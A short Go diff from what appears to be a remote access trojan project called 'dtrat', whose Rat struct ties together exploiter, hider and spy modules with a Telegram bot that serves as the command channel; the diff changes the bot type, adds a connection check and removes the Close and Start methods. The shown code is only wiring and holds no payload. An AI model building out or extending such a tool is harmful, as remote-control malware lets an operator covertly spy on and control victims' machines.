@@ -7,14 +7,12 @@ import (
 	"dtrat/exploiter"
 	"dtrat/hider"
 	"dtrat/spy"
-	"errors"
 	"fmt"
-
-	"github.com/deuterium34/dlog"
+	"io"
 )
 
 type Rat struct {
-	Bot       *bot.Tgbot
+	Bot       bot.Bot
 	Engine    *engine.Engine
 	Exploiter *exploiter.Exploiter
 	Hider     *hider.Hider
@@ -24,17 +22,17 @@ type Rat struct {
 	CloseCh chan (error)
 }
 
-var (
-	ErrClosed = errors.New("Closed")
-)
-
 func NewRat() (*Rat, error) {
 	cfg, err := config.NewConfig("config.toml")
 	if err != nil {
 		return nil, fmt.Errorf("NewConfig: %w", err)
 	}
 
-	bot, err := bot.NewBot(cfg)
+	bot, err := bot.NewTgBot(cfg)
+	if err == io.EOF {
+		panic("Отсутсвует соединение")
+	}
+
 	if err != nil {
 		return nil, fmt.Errorf("NewBot: %w", err)
 	}
@@ -70,22 +68,4 @@ func NewRat() (*Rat, error) {
 	}
 
 	return &rat, nil
-}
-
-func (r *Rat) internalClose(reason error) {
-	r.Bot.Close()
-	r.Engine.Close()
-	r.Spy.Close()
-
-	r.CloseCh <- reason
-}
-
-func (r *Rat) Close() {
-	r.internalClose(ErrClosed)
-}
-
-func (r *Rat) Start() {
-	dlog.GLogger.Info("Запуск ратника")
-	go r.Bot.CommandsHandligLoop(r.Engine)
-	go r.Bot.WakeNotification()
 }
